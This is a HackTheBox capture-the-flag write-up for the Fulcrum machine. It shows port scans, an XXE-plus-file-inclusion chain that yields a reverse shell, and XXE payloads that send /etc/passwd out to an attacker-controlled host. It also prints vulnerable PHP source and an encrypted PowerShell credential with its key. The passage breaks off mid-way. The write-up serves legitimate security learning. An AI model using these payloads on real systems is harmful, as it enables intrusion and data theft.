<li><a href="#searching-ldap">Searching LDAP</a></li>
</ul></li>
<li><a href="#getting-shell-on-file-server-as-btables">Getting shell on fIle server as btables</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a></li>
<li><a href="#autopwn-script">Autopwn script</a></li>
 
      
        <li><a href="#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
      </ul>
    </li>
   </ul>
  
   
  <ul class="nav nav-pills">
      <li><a class="p-logo" href="https://alamot.github.io/"><i class="fa fa-home" aria-hidden="true"></i> <span class="hidden768" lang="en">The Portal of Knowledge</span><span class="hidden768" lang="el">Η Πύλη της Γνώσης</span></a></li>
  </ul>
  
  <ul class="nav nav-pills pull-right topmargin7"> 
    <li id="lang-selector" role="presentation" class="dropdown">
      <a id="lang-index" class="dropdown-toggle btn-primary" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false">Language <i class="fa fa-caret-down" aria-hidden="true"></i></a>
      <ul class="dropdown-menu">
        <li><a id="en" href="#">English</a></li>
        <li><a id="el" href="#">Ελληνικά</a></li>
      </ul>
    </li>  
  </ul>
</div>
</nav>
<script>
langtext = "English";
language = localStorage.getItem('language');
if (language) {
  document.getElementById('mainbody').setAttribute('class', language);
  document.getElementById('mainbody').setAttribute('lang', language);
  if (language == 'el') { langtext="Ελληνικά"; }
  document.getElementById("lang-index").innerHTML=langtext+' <i class="fa fa-caret-down" aria-hidden="true"></i>';
}
</script>




<div class="container-fluid">
  <div class="row">
    <div class="col-md-12">
      <article class="single centered">
        <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
        <div class="body">
            <header lang="en"><h1 id="title" class="title">Fulcrum write-up</h1></header>
            <header lang="el"><h1 class="title">Ανάλυση του Fulcrum</h1></header>
            <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
            <time lang="en" class="topmargin7">09 Jun 2018</time>
            <time lang="el" class="topmargin7">09 Ιουν 2018</time>
            &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
            
              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
                <span lang="en">Cybersecurity</span>
                <span lang="el">Κυβερνοασφάλεια</span>
              </a>
            
            &middot; <i class="fa fa-tags topmargin7" aria-hidden="true"></i>
            
              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/hackthebox'>
                <span lang="en">hackthebox</span>
                <span lang="el">hackthebox</span>
                </a>
            
              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/bsd'>
                <span lang="en">bsd</span>
                <span lang="el">bsd</span>
                </a>
            
              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/linux'>
                <span lang="en">linux</span>
                <span lang="el">linux</span>
                </a>
            
              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/windows'>
                <span lang="en">windows</span>
                <span lang="el">windows</span>
                </a>
            
         
         <aside>
          <section>
            <header lang="en"><h2>Contents</h2></header>
            <header lang="el"><h2>Περιεχόμενα</h2></header>
            <div><nav id="TableOfContents">
<ul>
<li><a href="#enumeration">Enumeration</a>
<ul>
<li><a href="#port-scanning">Port scanning</a></li>
</ul></li>
<li><a href="#finding-an-entry-point-i-e-getting-a-shell">Finding an entry point (i.e. getting a shell)</a>
<ul>
<li><a href="#getting-shell-on-the-webserver-as-webuser">Getting shell on the webserver as WebUser</a></li>
</ul></li>
<li><a href="#getting-ldap-credentials">Getting LDAP credentials</a>
<ul>
<li><a href="#searching-ldap">Searching LDAP</a></li>
</ul></li>
<li><a href="#getting-shell-on-file-server-as-btables">Getting shell on fIle server as btables</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a></li>
<li><a href="#autopwn-script">Autopwn script</a></li>
</ul>
</nav></div>
          </section>
         </aside>
        
        

<h1 id="enumeration">Enumeration</h1>

<h2 id="port-scanning">Port scanning</h2>

<p>Let&rsquo;s scan the full range of TCP ports using my tool htbscan.py (you can find it here: <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py</a>).</p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo htbscan.py 10.10.10.62 <span class="m">200</span>
</span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Running command: sudo masscan -e tun0 -p0-65535 --max-rate 200 --interactive 10.10.10.62
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-06-08 20:43:37 GMT
</span></span></span><span class="line"><span class="cl"><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span></span></span><span class="line"><span class="cl"><span class="go">Initiating SYN Stealth Scan
</span></span></span><span class="line"><span class="cl"><span class="go">Scanning 1 hosts [65536 ports/host]
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 9999/tcp on 10.10.10.62                                   
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 88/tcp on 10.10.10.62                                     
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 80/tcp on 10.10.10.62                                     
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 4/tcp on 10.10.10.62                                      
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 56423/tcp on 10.10.10.62                                  
</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 22/tcp on 10.10.10.62                                     
</span></span></span><span class="line"><span class="cl"><span class="go">rate:  0.00-kpps, 100.00% done, waiting -582-secs, found=6        
</span></span></span><span class="line"><span class="cl"><span class="go">                                                                             
</span></span></span><span class="line"><span class="cl"><span class="go">Running command: sudo nmap -A -p4,22,80,88,9999,56423 10.10.10.62
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-09 00:03 EEST
</span></span></span><span class="line"><span class="cl"><span class="go">Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
</span></span></span><span class="line"><span class="cl"><span class="go">NSE Timing: About 0.00% done
</span></span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for fulcrum.local (10.10.10.62)
</span></span></span><span class="line"><span class="cl"><span class="go">Host is up (0.18s latency).
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT      STATE SERVICE VERSION
</span></span></span><span class="line"><span class="cl"><span class="go">4/tcp     open  http    nginx 1.10.3 (Ubuntu)
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: nginx/1.10.3 (Ubuntu)
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
</span></span></span><span class="line"><span class="cl"><span class="go">22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class="line"><span class="cl"><span class="go">| ssh-hostkey: 
</span></span></span><span class="line"><span class="cl"><span class="go">|   2048 a8:28:6e:d0:af:ab:46:de:c5:09:3d:76:ad:5a:44:e0 (RSA)
</span></span></span><span class="line"><span class="cl"><span class="go">|   256 c1:5c:1d:ea:99:ec:e0:a1:dc:04:c5:5a:ad:50:36:f6 (ECDSA)
</span></span></span><span class="line"><span class="cl"><span class="go">|_  256 a5:2f:44:e6:e3:10:cf:f7:db:15:d1:3f:49:21:3a:7b (ED25519)
</span></span></span><span class="line"><span class="cl"><span class="go">80/tcp    open  http    nginx 1.10.3 (Ubuntu)
</span></span></span><span class="line"><span class="cl"><span class="go">| http-methods: 
</span></span></span><span class="line"><span class="cl"><span class="go">|_  Potentially risky methods: TRACE
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: nginx/1.10.3 (Ubuntu)
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Input string was not in a correct format.
</span></span></span><span class="line"><span class="cl"><span class="go">88/tcp    open  http    nginx 1.10.3 (Ubuntu)
</span></span></span><span class="line"><span class="cl"><span class="go">| http-robots.txt: 1 disallowed entry 
</span></span></span><span class="line"><span class="cl"><span class="go">|_/
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: nginx/1.10.3 (Ubuntu)
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: phpMyAdmin
</span></span></span><span class="line"><span class="cl"><span class="go">9999/tcp  open  http    nginx 1.10.3 (Ubuntu)
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: nginx/1.10.3 (Ubuntu)
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Login
</span></span></span><span class="line"><span class="cl"><span class="go">56423/tcp open  http    nginx 1.10.3 (Ubuntu)
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Fulcrum-API Beta
</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Site doesn&#39;t have a title (application/json;charset=utf-8).
</span></span></span><span class="line"><span class="cl"><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
</span></span></span><span class="line"><span class="cl"><span class="go">Aggressive OS guesses: Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.13 (92%), Linux 3.2 - 4.9 (92%), Linux 4.8 (92%), Linux 4.9 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.12 (92%)
</span></span></span><span class="line"><span class="cl"><span class="go">No exact OS matches for host (test conditions non-ideal).
</span></span></span><span class="line"><span class="cl"><span class="go">Network Distance: 2 hops
</span></span></span><span class="line"><span class="cl"><span class="go">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span></code></pre></div></div>

<h1 id="finding-an-entry-point-i-e-getting-a-shell">Finding an entry point (i.e. getting a shell)</h1>

<p>If we visit <a href="http://10.10.10.62:4/" target="_blank">http://10.10.10.62:4/</a> we see a link to <a href="http://10.10.10.62:4/index.php?page=home:" target="_blank">http://10.10.10.62:4/index.php?page=home:</a>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Under Maintance<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Please <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://10.10.10.62:4/index.php?page=home&#34;</span><span class="p">&gt;</span>try again<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span> later.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span></span></span></code></pre></div></p>

<p>Hmmm&hellip; Well, it smells like a file inclusion. But we cannot make it work for the time being. Let&rsquo;s explore more. On port 56423 we encounter something very interesting, i.e. a JSON response:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;Heartbeat&#34;</span><span class="p">:{</span><span class="nt">&#34;Ping&#34;</span><span class="p">:</span><span class="s2">&#34;Pong&#34;</span><span class="p">}}</span></span></span></code></pre></div></p>

<p>Now read this: <a href="https://blog.netspi.com/playing-content-type-xxe-json-endpoints/" target="_blank">https://blog.netspi.com/playing-content-type-xxe-json-endpoints/</a>. It seems that XXE on JSON endpoints are quite usual even on production systems.</p>

<p>Let&rsquo;s run a webserver on our side:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python -m SimpleHTTPServer SRVPORT
</span></span><span class="line"><span class="cl"><span class="go">Serving HTTP on 0.0.0.0 port SRVPORT ...
</span></span></span></code></pre></div></div></p>

<p>Now, if we send a POST request like that:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">10.10.10.62:56423</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">198</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="g">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;
</span></span></span><span class="line"><span class="cl"><span class="g">&lt;!DOCTYPE hack [&lt;!ENTITY xxe SYSTEM &#34;http://SRVHOST:SRVPORT/shell.php&#34; &gt;]&gt;
</span></span></span><span class="line"><span class="cl"><span class="g">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></span></span></code></pre></div></p>

<p>We will get this request back on our webserver:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.62 - - [09/Jun/2018 09:07:23] &#34;GET /shell.php HTTP/1.0&#34; 200 -</span></span></code></pre></div></p>

<p>But unfortunately this will NOT run our shell.php. If only we could make it somehow to include our php file&hellip; Wait! What? Include? Inclusion? Do you remember page=home on port 4? Let&rsquo;s try it:</p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> curl http://10.10.10.62:56423/ -X POST --data-binary <span class="s1">&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY xxe SYSTEM &#34;http://127.0.0.1:4/index.php?page=http://SRVHOST:SRVPORT/shell&#34; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&#39;</span>
</span></span></code></pre></div></div>

<p>Don&rsquo;t forget to setup our listener. Also, note that I removed the .php extension from shell.php because -as we see in the webserver requests- the .php extension is added automatically when we use the inclusion on port 4.</p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> nc -lvp <span class="m">60001</span>
</span></span><span class="line"><span class="cl"><span class="go">nc: listening on :: 60001 ...
</span></span></span><span class="line"><span class="cl"><span class="go">nc: listening on 0.0.0.0 60001 ...
</span></span></span><span class="line"><span class="cl"><span class="go">nc: connect to 10.10.15.45 60001 from fulcrum.local (10.10.10.62) 40562 [40562]
</span></span></span><span class="line"><span class="cl"><span class="go">nc: using stream socket
</span></span></span><span class="line"><span class="cl"><span class="go">Linux Fulcrum 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
</span></span></span><span class="line"><span class="cl"><span class="go"> 07:15:00 up  1:20,  0 users,  load average: 0.65, 0.95, 0.61
</span></span></span><span class="line"><span class="cl"><span class="go">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span></span><span class="line"><span class="cl"><span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></span><span class="line"><span class="cl"><span class="go">bash: cannot set terminal process group (1153): Inappropriate ioctl for device
</span></span></span><span class="line"><span class="cl"><span class="go">bash: no job control in this shell
</span></span></span><span class="line"><span class="cl"><span class="go">www-data@Fulcrum:/$ 
</span></span></span></code></pre></div></div>

<p>It works! For the sake of completion, note that -using XXE- we can also exfiltrate files. First, prepare a file exflt.xml which contains those lines:</p>

<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % data SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/passwd&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % param1 &#34;&lt;!ENTITY exfil SYSTEM &#39;http://SRVHOST:SRVPORT/%data;&#39;&gt;</span>&#34;&gt;</span></span></code></pre></div>

<p>Next, send a request like that:</p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> curl http://10.10.10.62:56423/ -X POST --data-binary <span class="s1">&#39;&lt;?xml version=&#34;1.0&#34; ?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % sp SYSTEM &#34;http://SRVHOST:SRVPORT/exflt.xml&#34;&gt;%sp;%param1;]&gt;&lt;bar&gt;&amp;exfil;&lt;/bar&gt;&#39;</span>
</span></span></code></pre></div></div>

<p>We will get the file contents base64-encoded back on our webserver:</p>

<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.62 - - [09/Jun/2018 16:58:36] &#34;GET /cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKbHhkOng6MTA2OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKZG5zbWFzcTp4OjEwNzo2NTUzNDpkbnNtYXNxLCwsOi92YXIvbGliL21pc2M6L2Jpbi9mYWxzZQptZXNzYWdlYnVzOng6MTA4OjExMTo6L3Zhci9ydW4vZGJ1czovYmluL2ZhbHNlCmJsdWVwcmludDp4OjEwMDA6MTAwMDpibHVlcHJpbnQsLCw6L2hvbWUvYmx1ZXByaW50Oi9iaW4vYmFzaApjb2xvcmQ6eDoxMDk6MTE3OmNvbG9yZCBjb2xvdXIgbWFuYWdlbWVudCBkYWVtb24sLCw6L3Zhci9saWIvY29sb3JkOi9iaW4vZmFsc2UKbGlidmlydC1xZW11Ong6NjQwNTU6MTE1OkxpYnZpcnQgUWVtdSwsLDovdmFyL2xpYi9saWJ2aXJ0Oi9iaW4vZmFsc2UKbGlidmlydC1kbnNtYXNxOng6MTEwOjExODpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi9iaW4vZmFsc2UKc3NoZDp4OjExMTo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.0&#34; 404</span></span></code></pre></div>

<p>Here is the index.php on port 4 for reference:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">Fulcrum</span><span class="o">:~</span><span class="err">$</span> <span class="nx">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">uploads</span><span class="o">/</span><span class="nx">index</span><span class="o">.</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="s2">&#34;&lt;h1&gt;Under Maintance&lt;/h1&gt;&lt;p&gt;Please &lt;a href=</span><span class="se">\&#34;</span><span class="s2">http://&#34;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_ADDR&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;:4/index.php?page=home</span><span class="se">\&#34;</span><span class="s2">&gt;try again&lt;/a&gt; later.&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$inc</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;page&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="k">include</span><span class="p">(</span><span class="nv">$inc</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div></p>

<p>Here is the index.php on port 56423 for reference:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">Fulcrum</span><span class="o">:~</span><span class="err">$</span> <span class="nx">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">api</span><span class="o">/</span><span class="nx">index</span><span class="o">.</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type:application/json;charset=utf-8&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Server: Fulcrum-API Beta&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">libxml_disable_entity_loader</span> <span class="p">(</span><span class="k">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$xmlfile</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$dom</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMDocument</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$dom</span><span class="o">-&gt;</span><span class="na">loadXML</span><span class="p">(</span><span class="nv">$xmlfile</span><span class="p">,</span><span class="nx">LIBXML_NOENT</span><span class="o">|</span><span class="nx">LIBXML_DTDLOAD</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$input</span> <span class="o">=</span> <span class="nx">simplexml_import_dom</span><span class="p">(</span><span class="nv">$dom</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nv">$input</span><span class="o">-&gt;</span><span class="na">Ping</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//check if ok
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="nv">$output</span> <span class="o">==</span> <span class="s2">&#34;Ping&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Heartbeat&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Ping&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;Ping&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Heartbeat&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Ping&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;Pong&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div></p>

<h2 id="getting-shell-on-the-webserver-as-webuser">Getting shell on the webserver as WebUser</h2>

<p>There is an interesting powershell script in /var/www/uploads/Fulcrum_Upload_to_Corp.ps1:</p>

<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">www-data</span><span class="nv">@Fulcrum</span><span class="err">:</span><span class="p">~$</span> <span class="nb">cat </span><span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">www</span><span class="p">/</span><span class="n">uploads</span><span class="p">/</span><span class="n">Fulcrum_Upload_to_Corp</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl"><span class="c"># TODO: Forward the PowerShell remoting port to the external interface</span>
</span></span><span class="line"><span class="cl"><span class="c"># Password is now encrypted \o/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$1</span> <span class="p">=</span> <span class="s1">&#39;WebUser&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$2</span> <span class="p">=</span> <span class="s1">&#39;77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48&#39;</span> <span class="n">-split</span> <span class="s1">&#39;,&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$3</span> <span class="p">=</span> <span class="s1">&#39;76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$4</span> <span class="p">=</span> <span class="nv">$3</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-key</span> <span class="nv">$2</span>
